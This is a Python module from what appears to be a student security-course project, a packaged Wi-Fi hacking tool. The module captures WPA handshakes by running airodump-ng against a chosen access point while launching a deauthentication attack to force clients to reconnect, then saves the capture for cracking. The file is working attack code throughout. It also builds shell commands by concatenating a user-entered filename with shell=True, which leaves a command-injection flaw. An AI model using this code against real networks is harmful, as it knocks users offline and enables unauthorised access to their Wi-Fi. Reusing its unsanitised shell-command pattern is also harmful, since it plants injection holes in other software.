'''
============================================================
                NSSECU2 - Hacking Tool Project
============================================================
        Members: Escalona, Fadrigo, Fortiz, Manzano, Sy
        Topic: WiFi Hacking Tool
        Description: The objective of this project is to 
                     create a packaged tool that will be 
                     able to do Wi-Fi scanning, cracking, 
                     and admin control access.
        Objective Functionalities:
            1. WPA Scanning & Handshake Capture
            2. WPA Cracking
            3. WiFi DOS
            4. Other Tools
            5. Windows Saved WiFi Passwords
============================================================

WPA HANDSHAKE CAPTURE MODULE
'''

import os
import sys
import subprocess
import time
import utils.utils as utils
import interfaces.interfaces as interface
import deauth.deauth as deauth
from threading import Thread

def capture_handshake(device, wifi):
    #Use these device details however needed
    device_logicalname = interface.get_logicalname(device)

    #Preparatory
    filename = ""
    while True:
        utils.header("WPA Capture","Capture Handshake")
        filename = input("Enter capture filename: ")
        if filename.strip() != "":
            break

    host_target = ""
    while True:
        utils.header("WPA Capture","Capture Handshake")
        temp = input("Enter Host Target MAC Address (leave empty if none): ")
        if temp == "":
            break
        elif temp != "" and utils.valid_mac(temp):
            host_target = temp

    #Prepare capture & deauth command
    capture_command = "airodump-ng -c " + wifi["channel"] + " --bssid " + wifi["bssid"] + " --output-format pcap -w " + filename + " " + device_logicalname
    deauth_command = deauth.deauth_wifi_command(wifi, device, host_target)        

    #Descriptions
    descs = [   
                "Capture Handshake", "\n", 
                "====CONFIGURATION DETAILS====",
                "Device: " + device_logicalname,
                "Target: " + wifi["essid"] + " (" + wifi["bssid"] + ") at channel " + wifi["channel"],
                "Host Target MAC Addess (for Deauth): " + host_target,
                "Capture Command: " + capture_command,
                "Deauth Command: " + deauth_command
            ]

    #Capture proper
    if utils.yesNo("WPA Capture", descs, "Begin Capture?", True):
        #Load processes and begin capture
        utils.header("WPA Capture", "Loading processes...")
        deauth_process = subprocess.Popen(deauth_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(3)
        capture_process = subprocess.Popen(capture_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        time.sleep(3)

        utils.header("WPA Capture", [
                "Capturing handshake...",
                "Capture Command: " + capture_command,
                "Deauth Command: " + deauth_command
            ])

        #Await for end of capture
        for line in capture_process.stdout:
            decoded = line.decode("utf-8")
            if "handshake" in decoded:
                break

        #End capture
        print("Handshake Captured, Ending Capture...")
        capture_process.kill()
        deauth_process.kill()
        time.sleep(6)
        interface.disable_monitor(device)

        #Rename file to remove the '-01' suffix that airodump-ng attaches
        rename = subprocess.Popen("mv " + filename + "-01.cap " + filename + ".cap", shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
        
        #To prevent input() issues after the stdouts of capture_process #DONT CHANGE
        utils.display_countdown("WPA Capture", ["Handshake Captured!"], 3) 

        return filename + ".cap"
    else:
        return str(None) 

#Non-blocking STDOUT => https://stackoverflow.com/a/4896288
def enqueue_output(out, queue):
    for line in iter(out.readline, b''):
        queue.put(line)
    out.close()